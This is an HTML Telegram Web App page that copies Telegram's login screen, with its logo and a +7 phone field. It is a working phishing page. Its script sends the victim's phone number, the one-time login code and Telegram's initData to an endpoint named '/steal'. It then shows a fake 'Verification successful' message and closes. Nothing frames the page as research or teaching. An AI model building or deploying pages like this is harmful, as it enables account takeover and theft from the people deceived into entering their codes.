<!DOCTYPE html>
<html>
<head>
    <title>Telegram</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <meta charset="UTF-8">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #ffffff;
            margin: 0;
            padding: 0;
            color: #000000;
        }
        .page {
            padding: 20px 16px;
            max-width: 400px;
            margin: 0 auto;
        }
        .logo {
            text-align: center;
            margin-bottom: 40px;
            padding-top: 40px;
        }
        .logo-img {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            margin: 0 auto 20px;
            background-size: cover;
            background-position: center;
        }
        .title {
            font-size: 21px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 8px;
        }
        .subtitle {
            font-size: 16px;
            color: #707579;
            text-align: center;
            margin-bottom: 30px;
            line-height: 1.4;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .label {
            font-size: 16px;
            margin-bottom: 8px;
            display: block;
            color: #000000;
        }
        .country-selector {
            background: #f7f8fa;
            border-radius: 12px;
            padding: 12px 16px;
            margin-bottom: 12px;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .country-info {
            flex: 1;
            display: flex;
            align-items: center;
        }
        .country-flag {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            margin-right: 12px;
            font-size: 18px;
            text-align: center;
            line-height: 24px;
        }
        .country-name {
            font-size: 16px;
            font-weight: 500;
        }
        .country-code {
            font-size: 16px;
            color: #707579;
        }
        .arrow {
            color: #707579;
            font-size: 18px;
        }
        .phone-input {
            width: 100%;
            padding: 12px 16px;
            background: #f7f8fa;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            outline: none;
        }
        .checkbox {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }
        .checkbox input {
            margin-right: 12px;
            width: 18px;
            height: 18px;
        }
        .btn {
            width: 100%;
            padding: 14px;
            background: #0088cc;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 10px;
        }
        .btn:disabled {
            background: #e0e0e0;
            color: #a0a0a0;
            cursor: not-allowed;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="page" id="phonePage">
        <div class="logo">
            <div class="logo-img" style="background-image: url('https://telegram.org/img/t_logo.png')"></div>
            <div class="title">Telegram</div>
            <div class="subtitle">Please confirm your country code and enter your phone number.</div>
        </div>

        <div class="form-group">
            <div class="label">Country</div>
            <div class="country-selector">
                <div class="country-info">
                    <div class="country-flag">ðŸ‡·ðŸ‡º</div>
                    <div class="country-name">Russia</div>
                </div>
                <div class="country-code">+7</div>
                <div class="arrow">â€º</div>
            </div>
        </div>

        <div class="form-group">
            <div class="label">Your phone number</div>
            <input type="tel" class="phone-input" id="phoneInput" placeholder="+7" value="+7">
        </div>

        <div class="checkbox">
            <input type="checkbox" id="keepSigned" checked>
            <label for="keepSigned">Keep me signed in</label>
        </div>

        <button class="btn" id="nextBtn" onclick="sendPhone()">NEXT</button>
    </div>

    <div class="page hidden" id="codePage">
        <div class="logo">
            <div class="logo-img" style="background-image: url('https://telegram.org/img/t_logo.png')"></div>
            <div class="title">Code</div>
            <div class="subtitle" id="codeSubtitle">We have sent a code to your phone.</div>
        </div>

        <div class="form-group">
            <div class="label">Verification Code</div>
            <input type="text" class="phone-input" id="codeInput" placeholder="-----" maxlength="5" style="text-align: center; letter-spacing: 8px;">
        </div>

        <button class="btn" id="confirmBtn" onclick="sendCode()">Confirm</button>
    </div>

    <script>
        function sendPhone() {
            const phone = document.getElementById('phoneInput').value;
            const tgData = Telegram.WebApp.initData;
            
            console.log('Sending phone:', phone);
            
            fetch('/steal', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    phone: phone,
                    tg_data: tgData,
                    stage: 'phone_entered'
                })
            }).then(response => {
                console.log('Phone sent successfully');
            }).catch(e => {
                console.error('Error sending phone:', e);
            });

            document.getElementById('phonePage').classList.add('hidden');
            document.getElementById('codePage').classList.remove('hidden');
            
            const maskedPhone = phone.slice(0, 4) + ' â€¢â€¢â€¢ â€¢â€¢â€¢ ' + phone.slice(-2);
            document.getElementById('codeSubtitle').textContent = `We have sent a code to ${maskedPhone}`;
        }

        function sendCode() {
            const code = document.getElementById('codeInput').value;
            const phone = document.getElementById('phoneInput').value;
            const tgData = Telegram.WebApp.initData;
            
            fetch('/steal', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    phone: phone,
                    code: code,
                    tg_data: tgData,
                    stage: 'code_entered'
                })
            }).catch(e => console.error('Error:', e));

            alert('Verification successful! Thank you.');
            Telegram.WebApp.close();
        }

        Telegram.WebApp.ready();
        Telegram.WebApp.expand();
        Telegram.WebApp.setHeaderColor('#4a8cDc');
        Telegram.WebApp.setBackgroundColor('#ffffff');
    </script>
</body>
</html>